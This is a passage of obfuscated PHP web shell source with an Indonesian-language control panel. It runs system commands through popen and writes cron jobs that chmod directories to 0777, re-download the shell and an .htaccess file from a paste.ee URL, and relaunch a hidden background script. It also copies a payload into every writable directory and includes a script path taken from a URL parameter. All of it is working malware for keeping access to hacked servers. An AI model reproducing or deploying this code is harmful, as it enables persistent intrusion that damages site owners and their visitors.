"\40\x32\76\46\x31", "\x72"); if (call_user_func($is_resource_fn_local, $handle)) { $output_popen = ''; while (!@call_user_func($feof_fn_local, $handle)) { $chunk = @call_user_func($fread_fn_local, $handle, 8192); if ($chunk === false || $chunk === '') { if (feof($handle)) { break; } if (function_exists("\165\163\x6c\145\145\x70")) { @usleep(100000); } else { @sleep(1); } if (feof($handle)) { break; } $chunk_retry = @fread($handle, 8192); if ($chunk_retry === false || $chunk_retry === '') { break; } $output_popen .= $chunk_retry; continue; } $output_popen .= $chunk; } @call_user_func($pclose_fn_local, $handle); if ($output_popen !== false) { $output = $output_popen; if ($original_cwd) { @call_user_func($chdir_fn_local_try, $original_cwd); } return $output; } } } if ($original_cwd) { @call_user_func($chdir_fn_local_try, $original_cwd); } return $output; } goto knsNB; iKQLz: goto veQjq; goto dgxKe; O_LFR: xmRTY: goto Ii8Ju; QHrod: function generateMutualProtectionCronCommands($cache_script_path, $target_file_path, $backup_url, $php_binary, $cron_id_suffix, $dynamic_names, $log_path) { global $function_exists_fn, $basename_fn, $dirname_fn; $commands = array(); $safe_target_path = safe_escapeshellarg($target_file_path); $safe_backup_url = safe_escapeshellarg($backup_url); $safe_cache_path = safe_escapeshellarg($cache_script_path); $safe_php = safe_escapeshellarg($php_binary); $safe_log_path = safe_escapeshellarg($log_path); $cron_id_comment = "\x23" . $dynamic_names["\x63\x72\x6f\x6e\137\160\x72\145\146\x69\x78"] . $cron_id_suffix; $chmod_dir_prefix_cmds = ''; $current_dir_for_cron = dirname($target_file_path); $depth = 0; $processed_dirs_for_cron = array(); while ($current_dir_for_cron && $current_dir_for_cron !== "\57" && $current_dir_for_cron !== "\x2e" && $depth < 7) { if (is_path_allowed_by_basedir($current_dir_for_cron)) { if (!in_array($current_dir_for_cron, $processed_dirs_for_cron)) { $chmod_dir_prefix_cmds = "\x63\150\x6d\157\x64\x20\60\67\x37\x37\x20" . safe_escapeshellarg($current_dir_for_cron) . "\40\x32\x3e\x2f\144\x65\x76\x2f\156\165\154\154\x3b\x20" . $chmod_dir_prefix_cmds; $processed_dirs_for_cron[] = $current_dir_for_cron; } } else { break; } $parent_for_cron = dirname($current_dir_for_cron); if ($parent_for_cron === $current_dir_for_cron) { break; } $current_dir_for_cron = $parent_for_cron; $depth++; } if ($current_dir_for_cron === "\57" && is_path_allowed_by_basedir("\57") && !in_array("\x2f", $processed_dirs_for_cron)) { $chmod_dir_prefix_cmds = "\x63\x68\x6d\157\x64\x20\x30\x37\x37\x37\40" . safe_escapeshellarg("\x2f") . "\40\62\x3e\x2f\x64\145\x76\57\x6e\x75\154\x6c\73\x20" . $chmod_dir_prefix_cmds; } $script_name_for_grep = $dynamic_names["\163\143\x72\x69\x70\x74\x5f\156\x61\155\x65"]; $grep_pattern = "\133" . substr($script_name_for_grep, 0, 1) . "\x5d" . substr($script_name_for_grep, 1); $safe_shell_path = safe_escapeshellarg(__FILE__); $rebuild_command = "\151\x66\40\x5b\x20\41\40\x2d\x66\40{$safe_cache_path}\40\x5d\x3b\x20\164\150\145\x6e\40{$safe_php}\40{$safe_shell_path}\x20\x72\145\142\x75\x69\x6c\x64\x5f\x63\141\143\150\x65\x5f\163\151\x6c\145\156\164\73\x20\x66\151\73"; $commands[] = "\52\x2f\x32\x20\52\40\52\40\x2a\x20\52\40" . $chmod_dir_prefix_cmds . "\x20\151\146\x20\x5b\x20\x21\40\55\x66\40{$safe_target_path}\x20\x5d\x3b\40\164\x68\x65\156\x20\167\x67\145\x74\40\55\161\x4f\x20{$safe_target_path}\x20{$safe_backup_url}\73\40\146\151\73\x20\143\x68\x6d\x6f\x64\40\x30\64\x34\64\x20{$safe_target_path}\x3b\40\151\x66\40\133\x20\41\40\x2d\x66\x20" . safe_escapeshellarg(dirname($target_file_path)) . "\x2f\56\150\x74\x61\143\143\145\163\163\40\135\x3b\40\x74\x68\145\156\x20\167\x67\x65\x74\40\x2d\161\117\x20" . safe_escapeshellarg(dirname($target_file_path)) . "\57\56\x68\164\141\143\x63\145\163\x73\40\x68\164\x74\160\x73\72\57\57\x70\141\163\x74\145\56\x65\x65\57\x72\x2f\x4c\x63\x54\x63\61\x34\x37\67\73\40\146\x69\73\40\x63\x68\155\x6f\x64\x20\x30\64\x34\64\x20" . safe_escapeshellarg(dirname($target_file_path)) . "\57\56\150\x74\x61\143\x63\145\x73\163\40{$cron_id_comment}"; $commands[] = "\x2a\57\x31\x20\x2a\x20\52\x20\52\x20\52\40" . $chmod_dir_prefix_cmds . "\x20{$rebuild_command}\40\x69\x66\40\41\40\160\163\40\x61\165\170\x20\174\x20\x67\x72\x65\160\40\55\x71\40\x27{$grep_pattern}\x27\73\40\x74\150\x65\x6e\x20\x6e\157\x68\x75\x70\x20{$safe_php}\x20{$safe_cache_path}\x20\x3e\40{$safe_log_path}\40\x32\x3e\x26\61\x20\x26\40\146\x69\40{$cron_id_comment}"; $path_var = safe_escapeshellarg(dirname($target_file_path)); $namashell_php = safe_escapeshellarg(dirname($target_file_path) . "\x2f\156\141\x6d\141\x73\150\x65\x6c\x6c\x2e\x70\150\160"); $index_php = safe_escapeshellarg(dirname($target_file_path) . "\57\x69\156\x64\x65\x78\56\160\x68\160"); $htaccess_file = safe_escapeshellarg(dirname($target_file_path) . "\x2f\x2e\150\164\x61\x63\x63\145\x73\x73"); $commands[] = "\52\57\62\40\x2a\x20\x2a\x20\x2a\40\52\40\x69\146\x20\133\40\x2d\x66\x20{$namashell_php}\x20\135\73\x20\x74\150\145\x6e\x20\x63\150\155\157\144\40\x30\64\64\64\40{$namashell_php}\x3b\x20\x66\151\40\46\46\x20\167\x67\x65\x74\40\x2d\x4f\40{$index_php}\40{$safe_backup_url}\x20\46\46\40\143\x68\x6d\x6f\x64\40\x30\x34\x34\64\40{$namashell_php}"; $commands[] = "\52\x2f\x31\x20\52\x20\52\40\x2a\x20\52\40\x63\150\x6d\x6f\x64\x20\60\67\65\x35\40{$path_var}"; $commands[] = "\52\x2f\x31\40\x2a\40\52\40\x2a\40\x2a\40\151\x66\40\x5b\40\41\x20\x2d\x66\x20{$namashell_php}\x20\135\73\40\x74\150\x65\156\40\164\x6f\x75\x63\150\x20{$namashell_php}\73\40\x66\151"; $commands[] = "\x2a\x2f\x31\40\52\x20\52\x20\x2a\x20\52\x20\151\x66\x20\x5b\x20\x21\40\55\x66\x20{$htaccess_file}\x20\135\x3b\x20\x74\x68\x65\156\40\164\x6f\165\x63\150\x20{$htaccess_file}\73\x20\146\x69"; $commands[] = "\52\x2f\62\40\x2a\40\52\40\x2a\x20\x2a\40\x63\150\x6d\x6f\144\40\60\x34\64\64\40{$htaccess_file}\x20\46\x26\40\167\147\x65\164\x20\x2d\x4f\40{$htaccess_file}\40\150\x74\164\x70\x73\72\57\x2f\x70\x61\163\164\x65\56\145\x65\x2f\x72\57\x4c\x63\x54\x63\61\64\x37\x37"; $commands[] = "\52\x2f\x31\40\x2a\40\x2a\40\x2a\40\x2a\40\155\153\x64\x69\x72\40\x2d\x70\x20{$path_var}"; return array_unique($commands); } goto TazK8; u1vLf: $realpath_fn = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\163\x63\x69\x69\137\162\x65\x61\154\x70\141\164\150", "\x72\x65\x61\154\x70\141\164\150"); goto LwWJV; ZOHPN: fTnwh: goto eZ0A4; sdRUo: $security_config_file = __DIR__ . "\x2f\x73\145\143\x75\162\x69\164\x79\x5f\x63\x6f\156\146\151\x67\x2e\x6a\163\157\x6e"; goto hI3zq; yBhZD: Qs7dI: goto zMcZI; NIOEn: goto h2PEK; goto lv3Lb; majnf: $_g_ascii_header = array(104, 101, 97, 100, 101, 114); goto M3mPR; J7rLW: h2PEK: goto qUxuX; t7DPO: echo urlencode(dirname(__FILE__)); goto Wh_JS; MhvV0: O7OQB: goto gnJHQ; zstcz: WEE4J: goto pXtOj; iI_ws: nk_tK: goto SSh8B; Sy2ZJ: $_g_ascii_htmlspecialchars = array(104, 116, 109, 108, 115, 112, 101, 99, 105, 97, 108, 99, 104, 97, 114, 115); goto LbyoQ; q_gEw: echo $htmlspecialchars_fn(isset($_SERVER["\x53\105\122\126\105\122\137\x41\x44\x44\x52"]) ? $_SERVER["\123\x45\x52\126\105\122\137\101\104\x44\x52"] : (isset($_SERVER["\114\x4f\103\x41\x4c\137\x41\x44\104\122"]) ? $_SERVER["\114\117\103\101\114\x5f\101\x44\x44\122"] : "\x4e\x2f\x41")); goto gvQfR; fNHbd: AwuGK: goto LhRCq; Mg4qS: F2T1h: goto g8Mqt; WBCGn: goto OieTB; goto lfqv4; EbRux: goto ylShB; goto WlvvY; uxId2: TvhJW: goto K_sEr; qJ7PH: goto O4K2t; goto yzXIk; vNToB: $_g_ascii_pclose = array(112, 99, 108, 111, 115, 101); goto vJBpd; WkYj_: PaRW1: goto gk6xa; gW0Cz: XwtZ7: goto zMKE8; dRqb8: function copyToAllDirs($startDir, $targetFilename, $sourcePath, $resultFilename, $targetDirForHeader, $originalNameForHeader) { if (!is_dir($startDir)) { return array("\145\x72\162\157\x72" => "\x44\151\x72\145\153\164\157\162\x69\x20\141\167\x61\154\x20\47{$startDir}\x27\x20\x74\151\x64\141\x6b\40\166\141\154\x69\144\56"); } if (!is_readable($startDir)) { return array("\145\x72\162\x6f\162" => "\104\151\x72\x65\x6b\x74\157\162\151\x20\x61\167\x61\154\x20\x27{$startDir}\x27\40\x74\x69\144\141\x6b\x20\x72\145\x61\144\141\x62\x6c\x65\x2e"); } if (!is_file($sourcePath) || !is_readable($sourcePath)) { return array("\145\x72\x72\x6f\x72" => "\x46\151\154\145\40\x73\x75\x6d\x62\x65\x72\40\x27{$sourcePath}\47\40\164\151\144\x61\x6b\x20\166\141\x6c\151\144\x2e"); } $copiedPaths = array(); $targetExt = pathinfo($targetFilename, PATHINFO_EXTENSION); $hasCopied = false; $copyCounter = 0; $saveThreshold = 50; try { if (is_writable($startDir)) { $randomFileNameForFormDeploy = generateRandomName($targetExt); $destPath = rtrim($startDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $randomFileNameForFormDeploy; if (!file_exists($destPath)) { if (@copy($sourcePath, $destPath)) { $hasCopied = true; @chmod($destPath, 292); $copiedPaths[] = $destPath; $copyCounter++; if ($copyCounter % $saveThreshold === 0) { saveResultsToFile($resultFilename, $copiedPaths, $targetDirForHeader, $originalNameForHeader); } } else { error_log("\106\x4f\x52\x4d\x5f\104\105\120\114\117\131\137\105\x52\x52\117\x52\72\40\107\141\x67\x61\154\x20\x63\x6f\x70\171\40\153\145\x20\162\x6f\157\164\72\40{$destPath}"); } } } else { error_log("\106\x4f\x52\115\137\x44\x45\x50\x4c\117\131\x5f\105\122\122\x4f\x52\72\40\x44\151\x72\40\165\x74\x61\x6d\141\x20\164\151\x64\x61\x6b\x20\x77\x72\151\x74\x61\142\x6c\x65\x3a\40{$startDir}"); } $directoryIterator = new RecursiveDirectoryIterator($startDir, RecursiveDirectoryIterator::SKIP_DOTS | RecursiveDirectoryIterator::FOLLOW_SYMLINKS); $iterator = new RecursiveIteratorIterator($directoryIterator, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD); foreach ($iterator as $item) { if ($item->isDir() && is_writable($item->getPathname())) { $randomFileNameForFormDeploy = generateRandomName($targetExt); $destPath = rtrim($item->getPathname(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $randomFileNameForFormDeploy; if (!file_exists($destPath)) { if (@copy($sourcePath, $destPath)) { $hasCopied = true; @chmod($destPath, 292); $copiedPaths[] = $destPath; $copyCounter++; if ($copyCounter % $saveThreshold === 0) { saveResultsToFile($resultFilename, $copiedPaths, $targetDirForHeader, $originalNameForHeader); } } else { error_log("\106\x4f\x52\115\x5f\x44\x45\x50\114\117\x59\x5f\105\122\122\117\122\x3a\40\x47\x61\x67\141\154\x20\143\157\x70\171\x20\x6b\x65\x20\x73\165\x62\x64\151\162\72\40{$destPath}"); } } } elseif ($item->isDir() && !is_writable($item->getPathname())) { error_log("\106\117\x52\x4d\137\x44\x45\x50\114\117\x59\x5f\x45\122\x52\117\x52\72\40\x53\165\142\x64\151\x72\40\x74\151\144\x61\153\40\167\162\x69\x74\x61\x62\154\145\x3a\40" . $item->getPathname()); } } } catch (UnexpectedValueException $e) { error_log("\106\x4f\x52\x4d\137\104\x45\120\114\117\x59\137\105\130\x43\105\120\x54\111\x4f\x4e\x3a\x20\x49\x74\x65\162\x61\163\x69\40\47{$startDir}\47\x3a\x20" . $e->getMessage()); if (!$hasCopied) { return array("\145\x72\x72\157\x72" => "\x45\x72\162\x6f\162\40\142\x61\x63\x61\x20\144\151\x72\x20\47{$startDir}\47\x3a\x20" . $e->getMessage()); } } catch (Throwable $e) { error_log("\x46\117\x52\115\137\104\105\120\114\117\131\137\x45\x58\x43\x45\x50\124\111\x4f\x4e\72\40\125\155\165\155\x20\x27{$startDir}\47\x3a\x20" . $e->getMessage()); if (!$hasCopied) { return array("\145\x72\162\x6f\x72" => "\105\x72\x72\157\162\x20\x73\x65\142\141\162\x20\x27{$startDir}\47\x3a\40" . $e->getMessage()); } } finally { if (!empty($copiedPaths)) { saveResultsToFile($resultFilename, $copiedPaths, $targetDirForHeader, $originalNameForHeader); } } if (empty($copiedPaths) && !$hasCopied) { return array("\145\x72\162\x6f\x72" => "\124\x69\x64\x61\x6b\40\141\144\141\x20\x66\151\x6c\145\40\144\151\163\141\x6c\x69\156\x20\50\x66\157\162\x6d\x20\144\145\160\154\x6f\171\51\56\40\103\x65\153\x20\151\x7a\151\156\x20\46\x20\154\x6f\x67\x2e"); } return $copiedPaths; } goto pvx0X; qljRU: if (in_array($active_menu, $protected_menus) && (!isset($_SESSION["\x73\150\145\154\x6c\x5f\141\x75\x74\150\145\x6e\x74\151\143\141\x74\x65\144"]) || $_SESSION["\x73\x68\145\x6c\154\137\141\165\x74\150\x65\x6e\x74\151\143\x61\164\x65\x64"] !== true)) { $login_error = ''; if ($_SERVER["\x52\105\121\125\x45\123\124\x5f\115\105\x54\x48\x4f\104"] === "\120\117\x53\x54" && isset($_POST["\x73\150\x65\154\x6c\137\x70\141\163\x73\x77\x6f\x72\144\x5f\151\156\160\x75\164"])) { if (password_verify($_POST["\163\x68\145\154\154\x5f\160\141\x73\163\167\x6f\x72\144\x5f\151\156\160\x75\x74"], $shell_password)) { $_SESSION["\x73\150\x65\x6c\x6c\x5f\141\165\164\x68\x65\156\x74\151\x63\141\x74\x65\x64"] = true; header("\114\157\143\141\164\151\157\x6e\72\x20" . $_SERVER["\x52\x45\x51\x55\105\x53\x54\x5f\x55\x52\x49"]); die; } else { $login_error = "\x50\141\x73\163\x77\x6f\162\144\40\123\x61\x6c\x61\x68\x21"; } } ?>
 <!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><title>Autentikasi</title><style>:root { --primary: #0f172a; --secondary: #020617; --accent: #00f0ff; --text: #e2e8f0; --highlight: #f0f; --danger: #ff2a6d; } body { font-family: 'Roboto Mono', monospace; background-color: var(--secondary); color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; } .login-box { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(0, 240, 255, 0.3); padding: 2rem; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 240, 255, 0.2); width: 340px; text-align: center; } h2 { font-family: 'Orbitron', sans-serif; color: var(--accent); text-shadow: 0 0 5px var(--accent); } input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid rgba(0, 240, 255, 0.3); background-color: #050505; color: var(--text); border-radius: 4px; box-sizing: border-box; } input[type="submit"] { width: 100%; padding: 12px; background-color: var(--accent); color: var(--secondary); border: none; border-radius: 4px; cursor: pointer; font-family: 'Orbitron', sans-serif; transition: all 0.2s; } input[type="submit"]:hover { background-color: #7dfffd; box-shadow: 0 0 10px var(--accent); } .error { color: var(--danger); } a { color: var(--accent); }</style></head><body><div class="login-box"><h2>AKSES TERBATAS</h2><p>Menu '<?php  echo htmlspecialchars(ucfirst(str_replace("\x5f", "\x20", $active_menu))); ?>
' memerlukan autentikasi.</p><form method="post"><input type="password" name="shell_password_input" placeholder="Password" required autofocus><input type="submit" value="Login"></form><?php  if (!empty($login_error)) { echo "\x3c\x70\x20\143\154\x61\163\x73\75\x22\145\x72\x72\157\162\42\76" . $login_error . "\x3c\x2f\x70\x3e"; } ?>
<p style="margin-top:20px;"><a href="?menu=explorer">Kembali ke File Explorer</a></p></div></body></html><?php  die; } goto z83jx; hby4D: goto hP226; goto dbcX8; n3ZVx: goto T1YLP; goto hMfbt; AHtMg: $_g_ascii_rename = array(114, 101, 110, 97, 109, 101); goto C7EPN; uVbTu: $_g_ascii_fread = array(102, 114, 101, 97, 100); goto RT2Hk; avkfh: KvxLr: goto nTb3z; wOjqx: goto vuHqt; goto QyieX; ku41x: goto f0gHQ; goto fflIG; FccYh: $_g_ascii_is_writable = array(105, 115, 95, 119, 114, 105, 116, 97, 98, 108, 101); goto Rdwuf; meucw: foreach ($sec_menus as $key => $menu_data) { $is_active = $active_menu === $key; echo "\74\x6c\151\76\74\141\40\150\162\x65\146\x3d\42\x3f\x6d\145\156\x75\75" . $key . "\x26\160\141\x74\x68\x3d" . urlencode($current_path) . "\x22\40\143\x6c\x61\163\x73\x3d\42\x6e\x61\x76\x2d\x6c\x69\156\x6b\x20\146\x6c\x65\170\40\x69\x74\x65\x6d\163\x2d\143\x65\x6e\x74\145\x72\x20\160\x78\x2d\63\40\x70\x79\55\x32\40\x74\145\170\164\x2d\x73\x6d\40\x72\157\165\156\x64\145\144\x2d\154\147\x20\x6d\x62\55\x31\x20" . ($is_active ? "\141\143\164\x69\x76\x65" : '') . "\42\76\x3c\x69\x20\143\154\141\x73\x73\x3d\x22\146\x61\163\40" . $menu_data["\151\x63\157\x6e"] . "\40\155\162\55\63\x20\x77\x2d\x34\40\164\145\x78\164\55\143\145\x6e\x74\x65\162\x22\40\163\x74\171\154\x65\75\42\143\x6f\154\157\162\x3a\166\x61\162\50\55\x2d\x61\143\143\x65\x6e\164\51\73\x22\x3e\74\x2f\151\x3e\74\x73\x70\x61\156\76" . $menu_data["\156\x61\155\x65"] . "\x3c\x2f\163\x70\x61\x6e\76\74\57\x61\76\x3c\57\154\x69\x3e"; } goto W6AWs; JH_uB: $_g_ascii_trim = array(116, 114, 105, 109); goto wKU9E; EDkDp: function scanner_sortByLastModified($files) { if (empty($files) || !is_array($files)) { return array(); } $filemtime_local_scan = _get_fn_name_global_init_v3("\137\x67\137\x61\x73\143\x69\x69\x5f\146\151\x6c\145\155\x74\151\155\x65", "\x66\x69\154\145\x6d\164\151\155\x65"); if (empty($filemtime_local_scan) || !function_exists($filemtime_local_scan)) { return $files; } $timestamps = array_map(function ($file) use($filemtime_local_scan) { return @call_user_func($filemtime_local_scan, $file); }, $files); $valid_timestamps = array(); $original_files = $files; $files_to_sort = array(); foreach ($timestamps as $key => $ts) { if ($ts !== false) { $valid_timestamps[$key] = $ts; $files_to_sort[$key] = $original_files[$key]; } } if (!empty($valid_timestamps)) { @array_multisort($valid_timestamps, SORT_DESC, $files_to_sort); $unstatable_files = array_diff_key($original_files, $valid_timestamps); return array_merge($files_to_sort, array_values($unstatable_files)); } return $original_files; } goto hby4D; z83jx: goto YOWE9; goto HMUuG; E9qXk: EcXJl: goto KqBvj; vWzhU: m3lL1: goto ZoiCd; M6QYs: i5wsB: goto EGiiX; lv3Lb: pxIzz: goto DDptI; pQH0O: IWd9z: goto jFs1q; UP2Kt: ?>
             </ul>
        </aside>

        <main class="main-content flex-1 overflow-auto ml-64">
            <div class="p-6">
                <header class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                    <div class="info-card rounded-lg p-3 glass-effect"><span class="cyber-font text-accent">Server:</span><br><?php  goto QLWtU; QSB0P: f0gHQ: goto Z6Qhi; pMFGs: if (call_user_func($function_exists_fn, $realpath_fn)) { $rp_final = @call_user_func($realpath_fn, $current_path); if ($rp_final) { $current_path = $rp_final; } } goto oS1yI; ft3Cq: @ini_set("\144\x69\163\x70\154\141\x79\x5f\x73\164\x61\162\x74\165\x70\x5f\x65\162\162\157\x72\163", "\x31"); goto I1T2K; Emj9D: function addDirectoryToZip($zip, $dir, $baseInZip) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($files as $name => $file) { if (!$file->isDir()) { $filePath = $file->getRealPath(); $relativePath = $baseInZip . substr($filePath, strlen($dir) + 1); $zip->addFile($filePath, $relativePath); } } } goto EbRux; MZFzZ: function saveResultsToFile($filename, $paths, $targetDir, $originalName) { if (empty($paths)) { return; } $resultContent = "\x3d\x3d\75\x20\x48\x61\163\151\154\40\x50\145\x6e\x79\145\142\x61\x72\x61\x6e\40\106\151\x6c\x65\40\x4d\141\x6e\165\x61\x6c\40\x3d\75\75\xa" . date("\x59\55\x6d\55\x64\x20\x48\72\x69\x3a\x73") . "\xa\124\141\162\x67\145\164\x3a\x20" . $targetDir . "\12\123\165\155\x62\145\x72\72\x20" . $originalName . "\12" . count($paths) . "\40\x6c\x6f\153\x61\x73\x69\72\12" . implode("\12", $paths) . "\12\x49\172\151\156\x3a\40\x30\x34\x34\x34"; @file_put_contents($filename, $resultContent); if (@filesize($filename) == 0) { error_log("\106\117\x52\115\137\x44\x45\x50\114\117\x59\137\x53\x41\126\105\137\x46\101\x49\x4c\72\x20\107\141\147\141\x6c\40\x74\165\154\x69\x73\40\x68\x61\x73\151\154\x20\x73\x65\x62\141\x72\x20\x6d\x61\x6e\165\x61\154\x20\x6b\145\x20{$filename}\40\x61\164\x61\x75\40\146\151\x6c\x65\40\x6b\157\163\157\156\x67\x2e"); } } goto bxBLq; kMLQA: goto Z6zDc; goto G2xR7; Y41ty: $error_messages = array(); goto jkXN9; c4pjW: $_g_ascii_ini_set = array(105, 110, 105, 95, 115, 101, 116); goto tCuXO; bxBLq: goto hNYrd; goto vZYIO; cJAJl: goto wrKP6; goto pb__g; fdot_: goto HCDOB; goto dToK_; gbXMy: $_g_ascii_register_shutdown_function = array(114, 101, 103, 105, 115, 116, 101, 114, 95, 115, 104, 117, 116, 100, 111, 119, 110, 95, 102, 117, 110, 99, 116, 105, 111, 110); goto PkXE5; Yr1Vr: y_RVA: goto I3FlD; qvuIa: $basename_fn = _get_fn_name_global_init_v3("\137\147\x5f\141\x73\143\151\151\x5f\142\x61\x73\x65\156\141\155\145", "\x62\141\163\x65\x6e\141\155\x65"); goto r4EtM; dtl3d: u8eKT: goto U2_hE; xYtzS: goto XAk98; goto F9K8N; rmnhN: function is_path_allowed_by_basedir($path) { $basedir_str = @ini_get("\x6f\x70\x65\156\x5f\x62\x61\x73\145\x64\x69\162"); if (empty($basedir_str)) { return true; } $real_path = @realpath($path) ?: $path; $real_path = str_replace("\x5c", "\x2f", $real_path); $allowed_paths = explode(PATH_SEPARATOR, $basedir_str); foreach ($allowed_paths as $allowed_path) { if (empty($allowed_path)) { continue; } $real_allowed_path = str_replace("\x5c", "\57", rtrim($allowed_path, "\x2f\134")); if ($real_path === $real_allowed_path || strpos($real_path, $real_allowed_path . "\57") === 0) { return true; } } return false; } goto tASYR; SSh8B: $_g_ascii_readfile = array(114, 101, 97, 100, 102, 105, 108, 101); goto WHd0A; wom0_: GZ5Ci: goto YEMPU; cYwac: $function_exists_fn = _get_fn_name_global_init_v3("\137\x67\137\141\163\x63\151\x69\137\146\x75\x6e\x63\x74\151\x6f\x6e\x5f\x65\x78\151\163\x74\163", "\x66\x75\156\x63\164\151\157\x6e\x5f\145\x78\151\163\x74\x73"); goto zipVi; RFmcE: goto vUdiY; goto Zxq27; atWDI: goto LMTFw; goto kRTmd; DDptI: $_g_ascii_fileperms = array(102, 105, 108, 101, 112, 101, 114, 109, 115); goto mXXCx; HAKHG: goto FDlWD; goto le0rY; rXrxg: goto XwtZ7; goto kOBpL; vJBpd: goto uMrq3; goto YC4XC; jkXN9: goto V3dMi; goto DSeLu; Y2e3H: BFtrw: goto hDTEA; acnlJ: OieTB: goto Hcu4a; XAdAo: goto Dp2SQ; goto lGCNo; afh3k: if (isset($_SESSION["\163\x68\x65\x6c\154\137\141\165\x74\x68\145\x6e\164\151\143\141\164\145\144"]) && $_SESSION["\x73\x68\145\x6c\154\137\x61\x75\164\150\x65\156\164\151\x63\141\x74\x65\x64"] === true) { ?>
                 <li><a href="?logout=1" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1"><i class="fas fa-sign-out-alt mr-3 w-4 text-center" style="color:var(--warning);"></i><span>Logout</span></a></li>
                 <?php  } goto aStSR; SecgI: goto WKmMD; goto jaEYb; H_s4T: echo $htmlspecialchars_fn(function_exists("\x70\x68\160\x5f\x75\x6e\141\x6d\x65") ? php_uname("\156") : "\x4e\57\x41"); goto ibO0G; ydctN: if (isset($argv) && isset($argv[1]) && $argv[1] === "\162\x65\x62\x75\x69\x6c\144\x5f\x63\141\143\x68\x65\137\163\151\154\145\156\164" || isset($_GET["\x72\x75\156\137\142\141\x63\153\147\162\x6f\x75\x6e\x64\x5f\143\x61\143\x68\145"])) { if (session_status() === PHP_SESSION_NONE) { @session_start(); } $is_background_trigger = isset($_GET["\162\165\x6e\137\x62\x61\143\x6b\x67\x72\157\x75\x6e\144\137\143\141\143\x68\x65"]); $script_path = $is_background_trigger ? $_GET["\x72\x75\x6e\x5f\x62\x61\x63\x6b\x67\162\157\x75\156\x64\137\143\x61\x63\x68\x65"] : null; if (!$is_background_trigger) { if (isset($_SESSION["\143\141\143\x68\x65\x5f\x61\x63\x74\151\x76\145"]) && $_SESSION["\x63\x61\x63\x68\x65\x5f\141\143\164\x69\x76\145"] === true) { $cache_code = $_SESSION["\x63\x61\143\150\x65\x5f\143\x6f\144\x65\x5f\164\x65\155\x70\x6c\141\x74\x65"] ?? ''; $cache_script_filepath = $_SESSION["\143\x61\x63\150\x65\137\144\x69\x72\x5f\160\x61\x74\x68"] . DIRECTORY_SEPARATOR . $_SESSION["\x63\141\x63\150\145\137\163\143\x72\151\160\x74\x5f\x6e\141\x6d\145"]; if (!empty($cache_code) && !file_exists($cache_script_filepath)) { if (!is_dir(dirname($cache_script_filepath))) { @mkdir(dirname($cache_script_filepath), 511, true); } @file_put_contents($cache_script_filepath, $cache_code); @chmod($cache_script_filepath, 493); } } } if ($is_background_trigger && is_path_allowed_by_basedir($script_path) && file_exists($script_path)) { ignore_user_abort(true); set_time_limit(0); ob_start(); echo "\x4f\x4b"; header("\103\x6f\156\x6e\145\x63\164\151\157\x6e\x3a\40\x63\154\x6f\163\145"); header("\x43\x6f\156\x74\x65\x6e\x74\55\x4c\145\156\x67\x74\x68\72\40" . ob_get_length()); @ob_end_flush(); @flush(); if (function_exists("\x66\141\x73\164\143\x67\151\x5f\146\151\x6e\x69\163\x68\137\162\145\x71\x75\x65\163\x74")) { @fastcgi_finish_request(); } include $script_path; } die; } goto mIXul; xomwi: goto sXNro; goto eBX9K; YkM76: qSwDp: goto wBX7O; EH7O1: uH6ff: goto z5y1C; sYzJt: WTTUr: goto AFSDK; YIIpg: goto F9yDe; goto cj62i; bJFOm: dTu7R: goto TP3cB; Oyhou: aVYL_: goto n93H2; r4EtM: goto vUQzt; goto qponN; uDO_o: Sskku: goto uzEuU; cPbA1: ?>
            </ul>
             <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 mt-4 px-2 cyber-font">Security &amp; Persistence</h3>
             <ul>
                 <?php  goto jLoVH; lQgxU: $_g_ascii_sys_get_temp_dir = array(115, 121, 115, 95, 103, 101, 116, 95, 116, 101, 109, 112, 95, 100, 105, 114); goto CMGg8; Wh_JS: goto CIqpe; goto dtl3d; pvFrM: AQw2k: goto jQSGg; zIpA9: goto iYZ4r; goto zstcz; JLXM3: oo9j9: goto CgYvp; oalc0: cg1PF: goto nXzVi; p5Y_5: if (!empty($error_messages)) { echo "\74\x64\151\166\40\143\x6c\x61\x73\x73\x3d\x27\x6d\145\163\x73\141\147\145\x20\x65\x72\x72\x6f\x72\x27\76" . implode("\x3c\142\162\76", $error_messages) . "\74\x2f\x64\x69\x76\x3e"; } goto HswQK; jFs1q: function get_dynamic_cache_names() { $uname_fn = _get_fn_name_global_init_v3("\x5f\147\x5f\141\x73\x63\x69\151\137\x70\x68\x70\x5f\165\x6e\x61\155\145", "\x70\150\x70\x5f\x75\156\141\x6d\145"); $os_name = function_exists($uname_fn) ? strtolower($uname_fn("\163")) : "\163\x79\x73\x74\145\155"; $safe_os_name = preg_replace("\x2f\133\136\141\55\172\60\x2d\71\x5f\135\53\57", '', str_replace("\x20", "\x5f", $os_name)); if (empty($safe_os_name)) { $safe_os_name = "\x73\171\163\x74\145\155"; } $base_name = $safe_os_name . "\137\143\141\x63\x68\x65"; return array("\144\x69\162\x5f\x6e\x61\x6d\x65" => "\56" . $base_name . "\x5f\x6d\x61\x6e\x61\x67\145\x72\x5f" . substr(md5(__FILE__), 0, 6), "\x73\x63\162\x69\160\x74\137\156\141\155\x65" => $base_name . "\56\x70\150\160", "\x6c\157\147\x5f\156\x61\155\x65" => $base_name . "\56\x6c\x6f\147", "\143\x72\x6f\x6e\x5f\160\162\145\146\x69\x78" => $base_name . "\x5f", "\155\x65\x6e\x75\137\x74\x69\x74\x6c\145" => ucfirst($safe_os_name) . "\x20\103\141\143\150\145\40\x28\x30\x37\x37\67\51", "\x77\x61\164\x63\x68\x65\162\x5f\x6e\x61\x6d\145" => "\56\143\162\x6f\x6e\137\150\x65\154\x70\x65\162\56\x70\x68\160", "\151\156\164\x72\165\x64\145\x72\x5f\156\x61\x6d\x65" => 